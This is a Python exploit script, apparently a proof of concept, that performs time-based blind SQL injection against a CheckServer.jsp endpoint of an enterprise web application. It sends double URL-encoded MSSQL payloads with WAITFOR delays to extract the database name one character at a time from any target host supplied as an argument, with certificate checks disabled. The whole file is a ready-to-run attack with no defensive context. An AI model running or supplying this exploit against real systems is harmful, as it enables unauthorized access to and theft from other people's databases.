# coding:utf-8

import requests
import time
from random import Random
import string

import urllib3
urllib3.disable_warnings()
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0)",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}

def ascii_to_url(string):
    encode_string = ""
    for char in string:
        encode_string += hex(ord(char)).replace("0x", "%")
    return encode_string

def sqlinjection_poc(host):
    result = ''
    char = 'abcdefghigklmnopqrstuvwxyz@.1234567890$ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    for i in range(1, 7):
        for q in char:
            url = host + f'/mobile/plugin/CheckServer.jsp?type=mobileSetting&timestamp={int(time.time() * 1000)}'
            payload = f'''{str()}' IF ASCII(SUBSTRING((select db_name(1)),{i},1))={ord(q)} WAITFOR delay '0:0:6'ELSE SELECT 2 FROM MobileSetting where 'hfNI'='hfNI'''
            payload_encode = ascii_to_url(ascii_to_url(payload))
            data = '''settings=[{"scope":"1","module":"2","setting":"@'''+payload_encode+'''|1|1","modulename":"4","include":"5","orasc":"6"}]'''
            rsp = requests.post(url, data=data, headers=headers, timeout=30, verify=False)
            if rsp.elapsed.total_seconds() > 5:
                result += q
                print("第", i, "位：", q)
                i = i+1
                break
            else:
                pass
    print("select db_name(1) 查询结果为：" + result)

if __name__ == '__main__':
    sqlinjection_poc(sys.argv[1])
